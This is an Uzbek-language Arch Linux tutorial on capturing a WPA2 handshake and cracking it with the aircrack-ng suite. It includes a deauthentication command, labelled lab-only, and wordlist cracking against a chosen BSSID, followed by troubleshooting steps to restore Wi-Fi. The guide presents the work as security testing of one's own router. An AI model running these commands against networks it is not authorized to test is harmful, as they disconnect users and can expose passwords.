airmon-NG



# 0) Arch Linux’da muhim shartlar (oldindan)

Arch’da hammasi sizning qo‘lingizda bo‘ladi, shuning uchun bularni tekshirib oling:

* **Wi-Fi adapter monitor mode’ni qo‘llashi shart**

  ```bash
  iw dev
  ```
* Kernel modul bloklanmagan bo‘lishi kerak:

  ```bash
  rfkill list
  ```

Agar `Soft blocked: yes` bo‘lsa:

```bash
sudo rfkill unblock all
```

---

# 1) Tayyorlov: muhit va vositalar (ARCH)

## Test tarmog‘i

* O‘zingizga tegishli router
* WPA2-PSK
* Kamida **1 ta client ulangan** bo‘lsin (telefon yetadi)

---

## Kerakli paketlar (pacman bilan)

```bash
sudo pacman -Syu
sudo pacman -S aircrack-ng iw wireless_tools tcpdump
```

> `airmon-ng`, `airodump-ng`, `aireplay-ng` — **aircrack-ng paketining ichida**

---

## Wordlist

Arch’da rockyou default yo‘q.

Agar bor bo‘lsa:

```bash
ls /usr/share/wordlists/
```

Agar yo‘q bo‘lsa (o‘zingiz yaratish yoki tashqi manbadan):

```bash
mkdir -p ~/wordlists
```

---

# 2) Wi-Fi adapterni monitor mode’ga o‘tkazish (ARCH)

## Interfeys nomini aniqlash

```bash
ip link
```

Masalan: `wlan0`

---

## Monitor mode

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

Natija:

* `wlan0` → `wlan0mon`

Tekshirish:

```bash
iwconfig
```

Agar `Mode:Monitor` bo‘lsa — tayyor.

---

# 3) Handshake yig‘ish

## Barcha tarmoqlarni ko‘rish

```bash
sudo airodump-ng wlan0mon
```

Quyidagilarni yozib oling:

* **BSSID**
* **CH (channel)**
* **SSID**

---

## Faqat maqsad tarmoqni tutish

```bash
sudo airodump-ng \
  --bssid <BSSID> \
  --channel <CH> \
  -w capture \
  wlan0mon
```

---

## Handshake olish (2 yo‘l)

### Variant A — TINCH YO‘L (tavsiya qilinadi)

* Telefoningizni Wi-Fi’dan **o‘chirib → yoqing**
* Yuqorida `WPA handshake:` yozuvi chiqadi

---

### Variant B — Deauth (faqat labda)

```bash
sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon
```

Bu:

* Client’ni uzadi
* Qayta ulanganida handshake chiqadi

---

# 4) Handshake’ni tekshirish

```bash
aircrack-ng capture-01.cap
```

Agar yuqorida:

```
WPA (1 handshake)
```

chiqsa — hammasi joyida.

---

# 5) Wordlist bilan tekshirish (cracking)

```bash
aircrack-ng \
  -w ~/wordlists/rockyou.txt \
  -b <BSSID> \
  capture-01.cap
```

* Agar parol wordlist’da bo‘lsa — topiladi
* Bo‘lmasa — **topilmaydi**, bu normal

---

# 6) Texnik tushuntirish (nima bo‘ldi)

* Siz **parolni buzmadiz**
* Siz **handshake’ni ushladingiz**
* Aircrack:

  * handshake’dan hash oladi
  * wordlist bilan solishtiradi
* WPA2 **to‘g‘ri sozlangan bo‘lsa**, kuchli parol **ochilmaydi**

Bu jarayon **xavfsizlikni baholash** uchundir.

---

# 7) Arch’da tozalash (oxirida)

```bash
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

---



##HOW TO FIX WI-FI 


Bu muammo **juda ko‘p uchraydi** va 99% hollarda **kernel/NetworkManager/monitor mode qoldiqlari** sabab bo‘ladi.

---

# 1) Eng tezkor tiklash (80% holatda yetadi)

## 1.1 Monitor mode’ni to‘liq o‘chirish

```bash
sudo airmon-ng stop wlan0mon
```

Agar `wlan0mon` qolib ketsa:

```bash
ip link
```

va majburan o‘chiring:

```bash
sudo ip link set wlan0mon down
```

---

## 1.2 NetworkManager’ni qayta ishga tushirish

```bash
sudo systemctl restart NetworkManager
```

Tekshirish:

```bash
nmcli device
```

Agar `wlan0` = `connected` yoki `disconnected` bo‘lsa — Wi-Fi qaytdi.

---

# 2) Agar Wi-Fi umuman ko‘rinmayotgan bo‘lsa

## 2.1 RFKill tekshirish (eng ko‘p uchraydi)

```bash
rfkill list
```

Agar:

```
Soft blocked: yes
```

bo‘lsa:

```bash
sudo rfkill unblock all
```

---

## 2.2 Interfeys mavjudligini tekshirish

```bash
ip link
```

Agar **wlan0 umuman yo‘q** bo‘lsa → driver masalasi.

---

# 3) Driver’ni tiklash (kritik qism)

## 3.1 Qaysi Wi-Fi chipset ekanini aniqlash

```bash
lspci | grep -i network
```

yoki USB bo‘lsa:

```bash
lsusb
```

Misollar:

* Intel → `iwlwifi`
* Realtek → `rtl88xx`, `rtl8192`
* Atheros → `ath9k`, `ath10k`

---

## 3.2 Kernel modulni qayta yuklash

Masalan Intel bo‘lsa:

```bash
sudo modprobe -r iwlwifi
sudo modprobe iwlwifi
```

Realtek misol:

```bash
sudo modprobe -r rtl88xxau
sudo modprobe rtl88xxau
```

So‘ng:

```bash
ip link
```

---

## 3.3 Kernel log’ni tekshirish (MUHIM)

```bash
dmesg | grep -i wifi
```

yoki:

```bash
dmesg | grep -i firmware
```

Agar `firmware missing` desa:

```bash
sudo pacman -S linux-firmware
```

va **reboot**.

---

# 4) NetworkManager o‘rniga iw + wpa_supplicant tekshiruvi (advanced)

Agar NM muammo qilsa:

```bash
sudo systemctl stop NetworkManager
sudo systemctl start wpa_supplicant
```

SSID’lar ko‘rinadimi:

```bash
iw dev wlan0 scan | less
```

Agar bu ishlasa — **driver sog‘lom**, muammo NM’da.

---

# 5) Eng oxirgi, lekin 100% yechim

## 5.1 Kernel va systemni yangilash

```bash
sudo pacman -Syu
```

## 5.2 Reboot

```bash
reboot
```

Arch’da **toza reboot** ko‘p muammoni hal qiladi, chunki:

* monitor mode
* virtual interface
* killed processes

to‘liq tozalanadi.

---

# 6) Oldini olish (keyingi safar buzilmasligi uchun)

Monitor mode’dan chiqqach **har doim**:

```bash
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

Agar lab ko‘p qilsangiz:

* alohida USB Wi-Fi adapter
* asosiy Wi-Fi’ni “pok” qoldiring

---

# 7) Qisqa xulosa

* Wi-Fi buzilmadi
* Driver o‘chmadi
* Faqat **monitor mode + service conflict**

Arch’da bu **normal holat**, qo‘rqinchli emas.

